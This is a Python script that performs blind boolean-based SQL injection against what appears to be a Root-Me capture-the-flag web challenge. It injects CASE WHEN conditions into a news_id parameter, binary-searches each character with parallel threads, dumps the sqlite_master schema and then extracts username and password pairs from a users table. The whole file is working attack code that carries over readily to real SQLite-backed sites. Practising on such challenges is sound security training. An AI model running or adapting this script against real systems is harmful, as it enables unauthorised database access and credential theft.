import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

url = "http://challenge01.root-me.org/web-serveur/ch18/"
charset = sorted("s" + string.ascii_letters + string.digits + " _{}-(),~")
true_cond = "Système de news"
max_len = 100  # max length of string to extract
max_workers = 10  # number of concurrent threads

session = requests.Session()

def check_condition(query, pos, ch, operator):
    """
    Sends a payload testing if substr(query, pos, 1) <operator> ch
    operator: '>=' or '<'
    Returns True if condition is met, False otherwise.
    """
    condition = f"unicode(substr({query}, {pos}, 1)) {operator} {ord(ch)}"
    payload = f"?action=news&news_id=2-(CASE WHEN {condition} THEN 1 ELSE 0 END)"
    try:
        r = session.get(url + payload, timeout=5)
        return true_cond in r.text
    except requests.RequestException:
        return False

def binary_search_char(query, pos):
    """
    Binary search to find the exact character at position `pos` in result of `query`.
    Returns the found character or None if not found.
    """
    low, high = 0, len(charset) - 1
    while low <= high:
        mid = (low + high) // 2
        ch = charset[mid]
        # Check if char at pos >= ch
        if check_condition(query, pos, ch, '>='):
            low = mid + 1
        else:
            high = mid - 1
    if 0 <= high < len(charset):
        return charset[high]
    return None

def extract(query):
    """
    Extracts string result of SQL query from position 1 up to max_len.
    Uses threading to speed up extracting multiple positions in parallel.
    """
    result = [""] * max_len  # pre-allocate list for characters

    def worker(pos):
        ch = binary_search_char(query, pos)
        return pos, ch

    print(f"[i] Starting extraction from: {query}")

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(worker, pos) for pos in range(1, max_len + 1)]

        for future in as_completed(futures):
            pos, ch = future.result()
            if ch is None:
                # No char found, treat as end of string
                print(f"[-] No character found at position {pos}, stopping extraction.")
                # Cancel remaining futures (not guaranteed but try)
                for f in futures:
                    f.cancel()
                break
            else:
                result[pos - 1] = ch
                print(f"[+] Position {pos}: {ch}")

    extracted = "".join(result).rstrip("\x00 ").strip()
    print(f"\n[+] Extraction complete:\n{extracted}")
    return extracted

if __name__ == "__main__":
    # Example: Extract SQL from sqlite_master table
    db_schema_row0 = extract("(Select SQL FROM sqlite_master LIMIT 1 OFFSET 0)")
    db_schema_row1 = extract("(Select SQL FROM sqlite_master LIMIT 1 OFFSET 1)")

# CREATE TABLE news(id INTEGER, title TEXT, description TEXT)
# CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)

    creds = ["" for _ in range(5)]
    for i in range(5):
        creds[i] += extract(f"(Select username || char(32) || password FROM users LIMIT 1 OFFSET {i})")
    
    print("Extracted credentials snippets:")
    for i in range(5):
        print(f"Cred {i}: {creds[i]}")
    # # print("Extracted data snippet:\n", data)
